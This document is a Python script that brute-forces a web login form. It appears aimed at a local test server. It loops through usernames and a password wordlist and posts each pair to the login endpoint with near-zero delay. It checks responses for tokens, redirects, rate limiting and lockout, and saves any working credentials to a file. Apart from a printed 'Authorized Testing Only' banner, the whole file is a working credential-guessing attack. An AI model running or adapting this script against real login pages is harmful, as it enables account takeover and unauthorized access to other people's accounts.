import requests
import time
import random
import sys
from pathlib import Path

LOGIN_URL = "http://127.0.0.1:5000/login"   
USERNAME_LIST_PATH = ""                     
DEFAULT_USERNAMES = ["james","coco"]
WORDLISTS_PATH = "/usr/share/wordlists/testpasswords.txt"
DELAY = 0.0000000000000000000000000001                            
JITTER = 0.000000000000000001                           
DEFAULT_TIMEOUT = 5
USE_JSON_PAYLOAD = False                  

def attempt_login(session, url, username, password, json_payload=False, headers=None):

    try:
        payload = {"username": username, "password": password}
        if json_payload:
            r = session.post(url, json=payload, headers=headers, timeout=DEFAULT_TIMEOUT)
        else:
            r = session.post(url, data=payload, headers=headers, timeout=DEFAULT_TIMEOUT)

        if r.status_code == 200:
            try:
                j = r.json()
                if isinstance(j, dict):
                    for k, v in j.items():
                        if "token" in str(k).lower() or (isinstance(v, bool) and v is True) or str(v).lower() in ("success","ok"):
                            return ("success", r)
            except Exception:
                pass
            if r.url != url:
                return ("success", r)
            return ("invalid", r)

        if r.status_code == 401:
            return ("invalid", r)
        if r.status_code == 403:
            return ("locked", r)
        if r.status_code == 429:
            return ("ratelimit", r)

        return ("invalid", r)

    except requests.exceptions.RequestException as e:
        return ("error", str(e))

def load_usernames():
    
    if USERNAME_LIST_PATH:
        p = Path(USERNAME_LIST_PATH)
        if not p.exists():
            print("Username list not found:", USERNAME_LIST_PATH)
            sys.exit(1)
        return [u.strip() for u in p.read_text().splitlines() if u.strip()]
    return DEFAULT_USERNAMES.copy()

def main():
    print("⚠  Authorized Testing Only! Proceeding...\n")

    session = requests.Session()
    headers = {"User-Agent": "bruteforce-multiuser/1.0"}

    wl = Path(WORDLISTS_PATH)
    if not wl.exists():
        print("Password wordlist not found:", WORDLISTS_PATH)
        sys.exit(1)
    passwords = [w.strip() for w in wl.read_text(encoding="latin-1").splitlines() if w.strip()]

    usernames = load_usernames()
    if not usernames:
        print("No usernames to try; exiting.")
        sys.exit(1)

    attempts = 0
    for user in usernames:
        for pwd in passwords:
            attempts += 1
            print(f"[try #{attempts}] {user} : {pwd}")
            status, info = attempt_login(session, LOGIN_URL, user, pwd,
                                         json_payload=USE_JSON_PAYLOAD,
                                         headers=headers)

            if status == "success":
                print(f"[+] SUCCESS: {user}:{pwd}")
                Path("success.txt").write_text(f"{user}:{pwd}\nResponseURL: {info.url}\nStatus: {info.status_code}\n")
                return
            elif status == "ratelimit":
                print("[!] Received 429 Too Many Requests — backing off.")
                time.sleep(min(120, DELAY * 2 + random.random() * JITTER))
            elif status == "locked":
                print("[!] Account locked or forbidden. Stopping.")
                return
            elif status == "error":
                print("[!] Network error:", info)
                time.sleep(5)
            else:
                time.sleep(max(0, DELAY + (random.random() * JITTER - JITTER/2)))

    print("[-] All usernames/passwords tested. No success found.")

if __name__ == "__main__":
    main()